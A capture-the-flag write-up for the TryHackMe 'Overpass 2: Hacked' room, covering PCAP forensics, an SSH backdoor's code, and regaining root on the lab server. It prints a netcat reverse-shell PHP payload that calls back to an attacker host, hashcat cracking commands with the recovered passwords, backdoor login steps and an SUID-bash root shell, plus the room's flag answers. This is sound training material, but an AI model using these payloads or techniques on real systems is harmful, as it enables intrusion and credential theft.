# Overpass 2: Hacked

The flags are structured to basically walk us through this room.

## Forensics: Analyze the PCAP

I've not actually used Wireshark outside of the TryHackMe: Wireshark 101 "room" (and a few short digressions in other rooms), so I'm honestly a little worried about my abilities here…

Filtering the PCAP file for HTTP requests reveals a single POST from 192.168.179.145 to http://192.168.170.159/development/upload.php. A subsequent request from 192.168.179.145 pulls the directory listing of /development/uploads/, and then GETs /development/uploads/payload.php. This suggests that 192.168.179.145 is the "attacker" and 192.168.179.145 is the target system.

FLAG 1: What was the URL of the page they used to upload a reverse shell? - /development/

We can save off this POST request to get at the uploaded payload.php file, which turns out to have the contents:

```php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

FLAG 2: What payload did the attacker use to gain access? - `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`

This is popping a simple reverse shell through netcat that connects back to 192.168.170.145:4242, which would seem to confirm that this was the machine used by the attacker.

This means that penetration occurs when this file is requested in packet 27.

Looking at subsequent TCP packets, we can see what the attacker typed in the packets going from 192.168.170.145 → 192.168.170.159, and the responses in the packets going from 192.168.170.159 → 192.168.170.145. Requests/Responses coming through netcat use the TCP PSH flag, so we can filter by `tcp.port == 4242 and tcp.flags.push` to zoom in on this conversation.

The attacker eventually issues `su james` to elevate privileges  (packet 71), and a few packets down we can see `james`'s password.

FLAG 3: What password did the attacker use to privesc? - `whenevernoteartinstant`

In packet 112 the attacker cats /etc/shadow, and we get a full dump in packet 114. They then issue `git clone https://github.com/NinjaJc01/ssh-backdoor`, generate an SSH private key, and switch to the included `backdoor` binary, at which point we lose the thread.

FLAG 4: How did the attacker establish persistence? - https://github.com/NinjaJc01/ssh-backdoor

Returning to packet 114, we can use Copy > Copy Bytes as Printable Text to pull the contents of /etc/shadow (+ a little garbage).  After a little cleanup, we have 5 users with passwords (including `james`, which we know already).

We extract the hashes and then throw Hashcat at this using the suggested "fasttrack" wordlist.

```bash
hashcat -m 1800 \
        -O hashes.txt /usr/share/wordlists/fasttrack.txt
```

Four out of the five passwords turn out to be crackable:

```
paradox:secuirty3
szymex:abcd123
bee:secret12
muirland:1qaz2wsx
```

This ironically *doesn't* include `james`!

FLAG 5: How many of the system passwords were crackable? - 4

* [TryHackMe: Wireshark 101](https://tryhackme.com/room/wireshark)
* [Using "netcat"](../Notes/Using%20%22netcat%22.md)

## Research: Analyze the Code

It turns out that https://github.com/NinjaJc01/ssh-backdoor is a real thing, with the code itself living in https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go.

FLAG 6: What's the default hash for the backdoor? - `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`

FLAG 7: What's the hardcoded salt for the backdoor? - `1c362db832f3f864c8c2fe05f2002a05`

The hashPassword() function here takes the SHA-512 hash of the provided password + the salt. The default has is overridden using the `-a` flag. We can see that the attacker used this flag when the `backdoor` was called in packet 3479.

```bash
./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

FLAG 8: What was the hash that the attacker used? - `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

We can use Hashcat to again crack this.

```bash
hashcat \
	-m 1710 \
	-O 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 \
	   ~/.local/share/red-team/wordlists/rockyou.txt
```

FLAG 9: What's the password? - `november16`

* [Using Hashcat](../Notes/Using%20Hashcat.md)
* [ssh-backdoor / main.go](https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go)

## Attack: Get Back In!

The last bit of this CTF uses a server, which for this run is at 10.10.114.161. Just visiting that page gives us our first flag.

FLAG 10: What message did the attacker leave as a heading when they defaced the website? - H4ck3d by CooctusClan

We'll get back in using the backdoor that the attacker set up. From the backdoor code we know that the SSH server is running on port 2222, and there don't seem to be any user checks. So…

```bash
env -u SSH_AUTH_SOCK -u SSH_AGENT_PID \
	ssh -p 2222 user@10.10.114.161
```

…lets us in as expected (with the password of `november16`).

The user flag is in /home/james/user.txt.

FLAG 11: What's the user flag? - `thm{d119b4fa8c497ddb0525f7ad200e6567}`

Unfortunately, none of the passwords we cracked earlier work anymore. After checking a couple of possible exploits to get around this, I decided just to see what SUID binaries were on the system (figuring that I'd check them against GTFOBins).

```bash
find / -type f -perm -u+s -exec ls -l "{}" \;
```

This turned up an unusual file - /home/james/.suid_bash.  Could this be… an SUID copy of Bash? Indeed it is!

```bash
/home/james/.suid_bash -p # Root shell!
```

The root flag is then in /root/root.txt.

FLAG 12: What's the root flag? - `thm{d53b2684f169360bb9606c333873144d}`

* [Exploiting Bash](../Notes/Exploiting%20Bash.md)
* [GTFOBins](https://gtfobins.github.io/)

ELAPSED TIME: 1 h 43 min

## References

* [TryHackMe: Overpass 2: Hacked](https://tryhackme.com/room/overpass2hacked)
